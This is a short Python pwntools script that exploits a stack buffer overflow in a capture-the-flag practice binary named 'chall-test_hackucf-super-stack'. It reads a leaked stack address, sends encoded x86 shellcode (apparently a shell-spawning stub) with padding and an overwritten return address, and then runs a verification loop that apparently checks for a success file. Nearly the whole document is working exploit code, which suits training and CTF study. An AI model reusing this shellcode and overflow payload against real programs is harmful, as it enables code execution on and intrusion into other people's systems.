from pwn import *

import time

import sys

target = process("./chall-test_hackucf-super-stack")
gdb.attach(target, gdbscript="verify_exploit")

target.recvuntil("buf: ")
leak = int(target.recvline().strip("\n"), 16)
print "target address is: " + hex(leak)

leak = leak + (116)
payload =  ""
payload += "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
payload += "000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(leak)
target.sendline(payload)

# Exploit Verification starts here

class ExploitTimedOut(Exception):
	pass

def timeOut(signum, frame):
	raise ExploitTimedOut()

signal.signal(signal.SIGALRM, timeOut)
signal.alarm(2)

try:
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)
except ExploitTimedOut:
	print("Exploit timed out")
